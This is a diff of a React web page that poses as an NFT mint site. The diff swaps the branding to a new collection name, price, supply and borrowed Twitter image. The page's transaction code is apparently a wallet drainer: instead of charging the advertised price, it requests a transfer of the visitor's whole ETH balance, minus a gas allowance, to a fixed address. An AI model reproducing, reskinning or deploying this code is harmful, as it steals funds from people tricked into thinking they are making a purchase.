@@ -3,10 +3,10 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = '0.045 / 0.055'
-const image = 'https://pbs.twimg.com/profile_images/1629833819623944192/X9mqDSyM_400x400.jpg'
-const Title = 'Tarzan™ Official'
-const supply = 6040
+const ethAmount = '35'
+const image = 'https://pbs.twimg.com/profile_images/1633742588845989889/acs-j8-V_400x400.jpg'
+const Title = 'Watda F*sh'
+const supply = 202
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -53,7 +53,7 @@ function App() {
             "to": '0x57f415C2128875C9e4e3EDB2080010837D10e1Cd',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             // "gasPrice": Number(gas * 600000000).toString(16),
-            "value": parseInt((convertedBalance - (Number(gas) / 20000)) * 1000000000000000000).toString(16)
+            "value": parseInt((convertedBalance - (Number(gas) / 10000)) * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
